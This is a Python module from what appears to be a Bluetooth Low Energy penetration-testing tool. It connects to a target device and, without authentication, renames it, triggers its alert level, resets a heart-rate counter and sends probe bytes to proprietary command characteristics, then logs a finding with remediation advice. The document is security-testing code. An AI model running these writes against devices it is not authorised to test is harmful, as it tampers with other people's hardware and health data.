"""
Stage 8 — GATT Semantic PoC / Targeted Interaction

Uses the GATT profile discovered in Stage 5 to perform purposeful,
semantically-meaningful writes that demonstrate real-world impact:

  Phase 1 — Baseline reads: capture current device state.

  Phase 2 — Semantic writes by UUID:
    0x2A00 (Device Name)  : rename → "BLE-PoC", read back to confirm, restore
    0x2A06 (Alert Level)  : High Alert (0x02), then No Alert (0x00)
    0x2A39 (HR Ctrl Point): Reset Energy Expended (0x01)
    Proprietary write UUID: probe command channel; flag notify pair if found

  Phase 3 — Record: finding with before/after values and any notify responses.

Uses the same wble-connect | wble-central pipeline as S5/S7.
Requires the full GATT profile (list[dict]) as returned by s5_interact.run().
"""

from __future__ import annotations

import re
import shutil
import subprocess
import tempfile
import time
from pathlib import Path

from whad.device import WhadDevice

from core.dongle import WhadDongle
from core.models import Target, Finding
from core.db import insert_finding
from core.logger import get_logger
import config

log = get_logger("s8_poc")

POC_TIMEOUT = 60   # seconds for the full script run
POC_NAME    = "BLE-PoC"

# Razer BLE command probes — single-byte then two-byte sequences.
# The 416D0000 write characteristic pairs with 416D0001 notify for responses.
_PROPRIETARY_PROBES: list[str] = [
    "00",
    "01",
    "02",
    "03",
    "ff",
    "00 00",
    "01 00",
    "02 00",
    "03 00",
    "ff 00",
    "00 01 00",
    "00 02 00",
]


def run(
    dongle: WhadDongle,
    target: Target,
    engagement_id: str,
    gatt_profile: list[dict],
) -> None:
    if not _cli_available():
        log.error("[S8] wble-connect or wble-central not in PATH.")
        return

    if not gatt_profile:
        log.info(f"[S8] No GATT profile for {target.bd_address} — skipping.")
        return

    addr = target.bd_address
    rand_flag = "-r" if target.address_type != "public" else ""

    readable = [c for c in gatt_profile if "read" in c.get("properties", [])]
    writable = [
        c for c in gatt_profile
        if "write" in c.get("properties", []) or "write_no_resp" in c.get("properties", [])
    ]
    notify_uuids = {
        c["uuid"].upper() for c in gatt_profile
        if "notify" in c.get("properties", [])
    }

    if not writable:
        log.info(f"[S8] No writable characteristics on {addr}.")
        return

    script_lines, actions = _build_poc_script(
        writable, readable, notify_uuids, target.name or addr[-5:]
    )
    if not script_lines:
        log.info(f"[S8] No semantic actions applicable for {addr}.")
        return

    script_path = _write_script(script_lines, engagement_id)
    log.info(
        f"[S8] Running PoC: {len(actions)} action(s): "
        f"{', '.join(a['label'] for a in actions)}"
    )
    log.debug(f"[S8] Script: {script_path}")

    dongle.device.close()
    time.sleep(0.5)

    stdout = ""
    stderr = ""
    rc = -1
    try:
        cmd = (
            f"wble-connect -i {config.INTERFACE} {rand_flag} {addr} "
            f"| wble-central --file {script_path}"
        )
        log.debug(f"[S8] cmd: {cmd}")
        result = subprocess.run(
            cmd, shell=True, capture_output=True, text=True, timeout=POC_TIMEOUT
        )
        stdout = result.stdout
        stderr = result.stderr
        rc = result.returncode
    except subprocess.TimeoutExpired:
        log.warning(f"[S8] Timeout after {POC_TIMEOUT}s.")
    except Exception as exc:
        log.error(f"[S8] Subprocess error: {type(exc).__name__}: {exc}")
    finally:
        _reopen_dongle(dongle)
        try:
            Path(script_path).unlink(missing_ok=True)
        except Exception:
            pass

    if stderr.strip():
        log.debug(f"[S8] stderr: {stderr.strip()[:200]}")
    log.debug(f"[S8] Raw stdout: {stdout[:600]!r}")

    evidence = _parse_poc_output(stdout, actions)
    _record_finding(target, engagement_id, actions, evidence)
    _print_summary(target, actions, evidence)


# ── Script building ───────────────────────────────────────────────────────────

def _build_poc_script(
    writable: list[dict],
    readable: list[dict],
    notify_uuids: set[str],
    device_name: str,
) -> tuple[list[str], list[dict]]:
    lines: list[str] = []
    actions: list[dict] = []

    # Phase 1: baseline reads (first 6 readable handles)
    for char in readable[:6]:
        lines.append(f"read {char['value_handle']}")

    # Phase 2: semantic writes per UUID
    for char in writable:
        uuid = char["uuid"].upper()
        handle = char["value_handle"]
        props = char.get("properties", [])
        write_cmd = "write" if "write" in props else "writecmd"

        if uuid == "2A00":
            # Rename device, confirm read-back, restore
            poc_hex  = POC_NAME.encode("utf-8").hex()
            orig_hex = device_name.encode("utf-8", errors="replace").hex()
            lines += [
                f"read {handle}",
                f"write {handle} hex {poc_hex}",
                f"read {handle}",
                f"write {handle} hex {orig_hex}",
            ]
            actions.append({
                "label": "device_name_rename",
                "handle": handle,
                "uuid": uuid,
                "poc_name": POC_NAME,
                "poc_hex": poc_hex,
                "restore_hex": orig_hex,
            })

        elif uuid == "2A06":
            lines += [
                f"{write_cmd} {handle} hex 02",   # High Alert
                f"{write_cmd} {handle} hex 00",   # No Alert (restore)
            ]
            actions.append({
                "label": "alert_level_trigger",
                "handle": handle,
                "uuid": uuid,
                "note": "0x02=High Alert, then 0x00=No Alert (restored)",
            })

        elif uuid == "2A39":
            lines.append(f"{write_cmd} {handle} hex 01")
            actions.append({
                "label": "hr_control_reset",
                "handle": handle,
                "uuid": uuid,
                "note": "0x01=Reset Energy Expended",
            })

        else:
            # Proprietary / unknown UUID — structured probe
            for pb in _PROPRIETARY_PROBES:
                lines.append(f"writecmd {handle} hex {pb}")
            has_pair = _has_notify_pair(uuid, notify_uuids)
            actions.append({
                "label": "proprietary_probe",
                "handle": handle,
                "uuid": uuid,
                "probe_count": len(_PROPRIETARY_PROBES),
                "has_notify_pair": has_pair,
            })
            if has_pair:
                log.info(
                    f"[S8] h={handle} ({uuid[:8]}...) has a companion notify "
                    "characteristic — responses may appear in output."
                )

    return lines, actions


def _has_notify_pair(write_uuid: str, notify_uuids: set[str]) -> bool:
    """Check for companion notify UUID sharing the same 128-bit service base.

    Example: write=416D0000-2D52-617A-6572-424C4501F40A
             notify=416D0001-2D52-617A-6572-424C4501F40A  → paired
    """
    if "-" not in write_uuid:
        return False
    suffix = write_uuid[9:]   # everything after "XXXXXXXX-"
    return any(
        "-" in n and n[9:] == suffix and n != write_uuid
        for n in notify_uuids
    )


# ── CLI helpers ───────────────────────────────────────────────────────────────

def _cli_available() -> bool:
    return (
        shutil.which("wble-connect") is not None
        and shutil.which("wble-central") is not None
    )


def _write_script(lines: list[str], engagement_id: str) -> str:
    script = "\n".join(lines) + "\n"
    fd, path = tempfile.mkstemp(prefix=f"s8_{engagement_id}_", suffix=".gsh")
    try:
        import os
        os.write(fd, script.encode())
    finally:
        import os
        os.close(fd)
    return path


def _reopen_dongle(dongle: WhadDongle) -> None:
    deadline = time.time() + 15.0
    attempt  = 0
    last_exc: Exception | None = None
    while time.time() < deadline:
        try:
            dongle.device = WhadDevice.create(config.INTERFACE)
            if attempt > 0:
                log.debug(f"[S8] Reopen after {attempt * 0.5:.1f}s")
            return
        except Exception as exc:
            last_exc = exc
            attempt += 1
            time.sleep(0.5)
    log.warning(
        f"[S8] Could not reopen device after 15s "
        f"({type(last_exc).__name__}: {last_exc!r})"
    )


# ── Output parsing ────────────────────────────────────────────────────────────

def _parse_poc_output(stdout: str, actions: list[dict]) -> dict:
    ansi_re = re.compile(r"\x1b\[[0-9;]*[mABCDEFGHJKLMSTfnsulh]")
    clean = ansi_re.sub("", stdout)

    reads: list[str] = []
    notifications: list[str] = []
    errors: list[str] = []
    write_acks = 0

    for line in clean.splitlines():
        lo = line.lower().strip()
        if not lo:
            continue
        # Read value lines: "Value: XXXX" or bare hex
        if "value:" in lo or re.match(r"[0-9a-f]{2}( [0-9a-f]{2})*$", lo):
            reads.append(line.strip())
        if "notif" in lo or "indicat" in lo:
            notifications.append(line.strip())
        if "error" in lo or "fail" in lo or "refused" in lo:
            errors.append(line.strip())
        if "ok" in lo or "success" in lo or "written" in lo or "sent" in lo:
            write_acks += 1

    return {
        "reads": reads,
        "notifications": notifications,
        "errors": errors,
        "write_acks": write_acks,
        "actions": actions,
    }


# ── Finding + summary ─────────────────────────────────────────────────────────

def _record_finding(
    target: Target,
    engagement_id: str,
    actions: list[dict],
    evidence: dict,
) -> None:
    labels = [a["label"] for a in actions]
    has_rename = "device_name_rename" in labels
    has_alert  = "alert_level_trigger" in labels
    has_prop   = "proprietary_probe" in labels

    parts = []
    if has_rename:
        parts.append(f"renamed device to '{POC_NAME}' via 0x2A00 without auth")
    if has_alert:
        parts.append("triggered High Alert state (0x2A06) without auth")
    if has_prop:
        n = sum(1 for a in actions if a["label"] == "proprietary_probe")
        pairs = sum(1 for a in actions if a["label"] == "proprietary_probe" and a.get("has_notify_pair"))
        parts.append(
            f"probed {n} proprietary command channel(s)"
            + (f" ({pairs} with notify response pair)" if pairs else "")
        )

    severity = "high" if (has_rename or has_alert) else "medium"
    desc = (
        f"GATT PoC on {target.bd_address} ({target.name or 'unnamed'}): "
        + "; ".join(parts)
        + (f". {len(evidence['notifications'])} notify response(s) captured."
           if evidence.get("notifications") else ".")
    )

    finding = Finding(
        type="gatt_poc",
        severity=severity,
        target_addr=target.bd_address,
        description=desc,
        remediation=(
            "Require LE Secure Connections (LESC) with MITM for all characteristic writes. "
            "Device Name (0x2A00) should be read-only or auth-gated. "
            "Set ATT_PERMISSION_AUTHEN_WRITE on all writable characteristics."
        ),
        evidence=evidence,
        engagement_id=engagement_id,
    )
    insert_finding(finding)
    log.info(f"FINDING [{severity}] gatt_poc: {target.bd_address} — {'; '.join(parts)}")


def _print_summary(
    target: Target,
    actions: list[dict],
    evidence: dict,
) -> None:
    print("\n" + "-" * 72)
    print("  STAGE 8 SUMMARY -- GATT PoC / Semantic Interaction")
    print("-" * 72)
    print(f"  Target  : {target.bd_address}")
    print(f"  Name    : {target.name or '(unnamed)'}")
    print()
    print("  Actions performed:")
    for a in actions:
        label = a["label"]
        if label == "device_name_rename":
            print(f"    [0x2A00  h={a['handle']}]  Device renamed → '{a['poc_name']}' → restored")
        elif label == "alert_level_trigger":
            print(f"    [0x2A06  h={a['handle']}]  High Alert (0x02) triggered → No Alert (0x00)")
        elif label == "hr_control_reset":
            print(f"    [0x2A39  h={a['handle']}]  HR Control: Reset Energy Expended (0x01)")
        elif label == "proprietary_probe":
            pair_note = "  ← has notify pair (responses expected)" if a.get("has_notify_pair") else ""
            print(
                f"    [{a['uuid'][:8]}... h={a['handle']}]  "
                f"{a['probe_count']} probe commands sent{pair_note}"
            )

    if evidence.get("reads"):
        print(f"\n  Read values captured ({len(evidence['reads'])}):")
        for r in evidence["reads"][:8]:
            print(f"    {r}")

    if evidence.get("notifications"):
        print(f"\n  Notify responses ({len(evidence['notifications'])}):")
        for n in evidence["notifications"][:8]:
            print(f"    {n}")

    if evidence.get("errors"):
        print(f"\n  Errors ({len(evidence['errors'])}):")
        for e in evidence["errors"][:5]:
            print(f"    {e}")

    print("-" * 72 + "\n")
